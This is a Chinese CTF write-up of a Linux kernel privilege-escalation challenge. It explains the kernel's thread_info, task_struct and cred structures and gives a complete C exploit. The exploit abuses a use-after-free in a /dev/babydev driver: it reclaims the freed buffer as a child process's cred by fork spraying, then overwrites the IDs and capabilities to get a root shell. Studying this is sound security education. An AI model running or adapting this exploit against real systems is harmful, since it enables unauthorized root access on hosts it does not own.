***

### 漏洞利用：

#### 了解 thread\_info：

在用户态二进制 PWN 中，最终目标为通过执行 system 或者 execve 获取 shell。但是在内核 PWN 中，最终的目标是提权。那么应该如何进行提权呢？首先需要了解 Linux 内核的相关机制。在旧版的 Linux 内核当中有个 thread\_info 结构体：

```c
struct thread_info {
    struct task_struct *task;    /* 指向主要的任务结构 task_struct */
    __u32 flags;                 /* 低级标志位 */
    __u32 status;                /* 线程同步标志 */
    __u32 cpu;                   /* 当前 CPU 编号 */
    mm_segment_t addr_limit;     /* 地址限制 */
    unsigned int sig_on_uaccess_error:1;
    unsigned int uaccess_err:1;  /* 用户态访问失败标志 */
};
```

在该结构体当中有一个 task 指针，指向另一个 task\_struct 结构体：

#### task\_struct：

```c
struct task_struct {
    ...
        /* 实际与客观的任务凭证 (COW) */
        const struct cred __rcu *real_cred;
        /* 有效的任务凭证 (COW) */
        const struct cred __rcu *cred;
    ...
    }
```

该结构体描述了进程的所有信息，其中包含了指向权限凭证的指针，而当中有存在 cred 结构体：

#### cred\_struct：

```c
struct cred {
    atomic_t usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t subscribers;
    void *put_addr;
    unsigned int magic;
    #endif
    kuid_t uid;    /* 进程的实际用户 ID (real UID) */
    kgid_t gid;    /* 进程的实际组 ID (real GID) */
    kuid_t suid;   /* 保存的用户 ID */
    kgid_t sgid;   /* 保存的组 ID */
    kuid_t euid;   /* 有效用户 ID (effective UID) */
    kgid_t egid;   /* 有效组 ID (effective GID) */
    kuid_t fsuid;  /* 用于文件系统的 UID */
    kgid_t fsgid;  /* 用于文件系统的 GID */
    unsigned securebits;
    kernel_cap_t cap_inheritable; /* 可继承的能力 */
    kernel_cap_t cap_permitted;   /* 允许的能力 */
    kernel_cap_t cap_effective;   /* 实际有效的能力 */
    kernel_cap_t cap_bset;        /* 能力边界集 */
    kernel_cap_t cap_ambient;     /* 环境能力集 */
    ...
    };
```

cred\_struct 用于保存进程的权限信息（如 UID, GID 等）。

#### 内核获取 thread\_info 地址的代码：

```c
/* 相关宏定义 */
#define PAGE_SHIFT      12
#define PAGE_SIZE       (_AC(1, UL) << PAGE_SHIFT)
#define THREAD_SIZE     (PAGE_SIZE << THREAD_SIZE_ORDER)

/* 获取 thread_info 地址的内联函数 */
static inline struct thread_info *current_thread_info(void) {
    return (struct thread_info *)(current_top_of_stack() - THREAD_SIZE);
}
```

因此在旧版的内核当中，当一个进程进入内核态以后，在当前栈顶偏移为 0x4000 或 0x8000 的位置（由编译内核时的配置决定），可以获取 thread\_info 地址，从而得到 task\_struct 的地址，进而得到 cred 的地址。由于在 cred 结构体当中保存着当前进程的权限信息，因此在内核 PWN 当中的最终目标是修改 cred 结构体。

***

### EXP 思路：

本题有一个较为简单的方法，由于 cred 结构体的大小事 0xa8，当创建一个新进程时，内核会在堆中申请 0xa8 长度的堆内存放 cred 结构体。因此利用思路如下：

利用 babyioctl 申请一个 0xa8 字节的堆，赋值给 babydev\_struct.buf，再释放，然后创建一个新进程，这样释放的 0xa8 大小的堆会分配给新进程的 cred 结构体。由于 UAF 漏洞，cred 结构体的内容是可控的，只要把控制权限改为 0，即 root 的 UID，就可以使创建的新进程获取到 root 权限，达到提权的目的。

***

#### 定义变量：

```c
#define DEV_PATH "/dev/babydev"
#define BABY_IOCTL_ALLOC 0x10001
#define CRED_SIZE 0xa8
#define SPRAY_CHILDREN 128
```

* DEV\_PATH：我们要攻击的设备路径。
* BABY\_IOCTL\_ALLOC：这就是我们之前分析出触发堆块重新分配的魔法命令号 65537。
* CRED\_SIZE：目标内核版本中 cred 结构体的大小。在旧版内核中，当创建一个新进程时，内核会在堆中申请 0xa8 长度的堆存放 cred 结构体。
* SPRAY\_CHILDREN：定义将要 fork 多少个子进程。

```c
static int fd2 = -1;
```

定义一个全局变量 fd2。这是因为后面提权操作是在子进程中调用的函数里执行的，设为全局变量方便直接向这个悬空文件描述符（悬挂指针）写入数据。

#### 函数辅助区：

```c
static void die(const char *msg)
{
    perror(msg);
    exit(1);
}
```

标准的错误处理函数，打印错误信息并直接退出。

***

```c
tatic void root_shell(void)
{
    puts("[+] uid is 0");

    execl("/bin/sh", "sh", NULL);
    die("execl");
}
```

调用 execl("/bin/sh", "sh", NULL); 替换当前进程镜像，弹出一个 Root Shell。

#### UAF 篡改 cred\_struct：

```c
static void overwrite_cred(void)
{
    uint32_t payload[20];
    memset(payload, 0, sizeof(payload));
    payload[0] = 1;                  /* usage */
    for (int i = 10; i < 20; i++)
        payload[i] = 0xffffffff;     /* five kernel_cap_t values */

    ssize_t n = write(fd2, payload, sizeof(payload));
    if (n != (ssize_t)sizeof(payload))
        return;

    if (getuid() == 0)  // 检查当前的 UID，如果是 0（Root），则调用 root_shell() 拿 flag。
        root_shell();
}
```

* 定义一个大小为 80 字节（20 \* 4 字节）的数组，并全部初始化为 0。因为 cred 结构体的前半部分全是各种 ID，只要把 UID、GID 等字段修改为 0（root 的 UID），就能获得 root 权限。
* cred 结构体的第一个成员是 `atomic_t usage;`（引用计数）。如果这里也被写成了 0，当进程结束时内核去释放这个 cred，会因为引用计数异常引发内核崩溃。所以必须保留它为 1。
* cred 结构体在各种 ID（uid, gid 等）后面，跟着 5 个 kernel\_cap\_t 类型的特权能力掩码。这里循环把 payload\[10] 到 payload\[19] 填充为全 1（即十六进制的 0xffffffff），意图是开启进程的所有 Capabilities

*由于 *<code>_cred_</code>* 结构体后面还有 *<code>_security_</code>*、*<code>_user_</code>\_ 等指针。如果把指针也覆盖了，内核一旦解引用就会立刻崩溃。因此，*<code>_write_</code>* 操作只覆盖前 80 个字节。\_

* 由于 UAF 漏洞，fd2 指向的那块内存实际上已经被分配给当前进程作为 cred 结构体了。通过 write，我们将精心构造的 payload 直接覆盖在当前进程的 cred 内存上。

#### 攻击执行流 -Main 函数

```c
int main(void)
{
    int fd1 = open(DEV_PATH, O_RDWR);                 // process 1
    if (fd1 < 0)
        die("open fd1");

    fd2 = open(DEV_PATH, O_RDWR);            
    if (fd2 < 0)
        die("open fd2");

    puts("[*] reallocating babydev buffer to cred-sized slab");
    if (ioctl(fd1, BABY_IOCTL_ALLOC, CRED_SIZE) < 0)  // process 2
        die("ioctl");

    puts("[*] freeing global buffer through fd1");
    close(fd1);                                       // process 3

    puts("[*] forking children to reclaim freed object as cred");
    for (int i = 0; i < SPRAY_CHILDREN; i++) {        // process 4
        pid_t pid = fork();
        if (pid < 0)
            die("fork");

        if (pid == 0) {
            overwrite_cred();
            _exit(0);
        }

        /* 子进程逻辑: 如果当前是子进程，它立刻调用 overwrite_cred() 
           尝试通过悬垂指针 fd2 篡改自己的权限。
           如果它刚好是拿到了毒化堆块，提权就会成功。
           如果没有提权成功，调用 _exit(0) 安静退出，以免干扰终端    */

        int status = 0;
        waitpid(pid, &status, 0);
        /* 父进程逻辑: 父进程等待子进程执行完毕，然后再去孵化下一个子进程，
           直到遍历完所有 SPRAY_CHILDREN。                         */
    }

    puts("[-] exploit failed");
    return 1;  // 如果整个循环跑完了还没弹出 shell，打印失败信息。
}

```

* 1. 打开两次设备。由于驱动程序的缺陷，fd1 和 fd2 在底层共享了同一个全局结构体指针。
* 2. 通过 fd1 调用 ioctl，传入魔法命令 0x10001 和目标大小 0xa8。驱动会分配一块 0xa8 大小的堆，赋值给全局指针 babydev\_struct.buf。
* 3. 关闭 fd1。驱动触发 release，释放了这块 0xa8 的内存。但是 fd2 依然认为这块内存是合法的设备缓冲区。UAF 状态成立。
* 4. 循环调用 fork() 创建子进程。因为每当创建一个新进程时，内核就会在堆中申请一块 0xa8 长度的内存存放新进程的 cred 结构体。由于内核 Slab 分配器的后进先出 LIFO 特性，刚才释放的那块 0xa8 内存，极大概率会被分配给其中一个子进程作为 cred。

### 总 EXP:

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define DEV_PATH "/dev/babydev"
#define BABY_IOCTL_ALLOC 0x10001
#define CRED_SIZE 0xa8
#define SPRAY_CHILDREN 128

static int fd2 = -1;

static void die(const char *msg)
{
    perror(msg);
    exit(1);
}

static void root_shell(void)
{
    puts("[+] uid is 0");
    execl("/bin/sh", "sh", NULL);
    die("execl");
}

static void overwrite_cred(void)
{
    uint32_t payload[20];
    memset(payload, 0, sizeof(payload));
    payload[0] = 1;                  /* usage */
    for (int i = 10; i < 20; i++)
        payload[i] = 0xffffffff;     /* five kernel_cap_t values */

    ssize_t n = write(fd2, payload, sizeof(payload));
    if (n != (ssize_t)sizeof(payload))
        return;

    if (getuid() == 0)
        root_shell();
}

int main(void)
{
    int fd1 = open(DEV_PATH, O_RDWR);
    if (fd1 < 0)
        die("open fd1");

    fd2 = open(DEV_PATH, O_RDWR);
    if (fd2 < 0)
        die("open fd2");

    puts("[*] reallocating babydev buffer to cred-sized slab");
    if (ioctl(fd1, BABY_IOCTL_ALLOC, CRED_SIZE) < 0)
        die("ioctl");

    puts("[*] freeing global buffer through fd1");
    close(fd1);

    puts("[*] forking children to reclaim freed object as cred");
    for (int i = 0; i < SPRAY_CHILDREN; i++) {
        pid_t pid = fork();
        if (pid < 0)
            die("fork");

        if (pid == 0) {
            overwrite_cred();
            _exit(0);
        }

        int status = 0;
        waitpid(pid, &status, 0);
    }

    puts("[-] exploit failed");
    return 1;
}

```

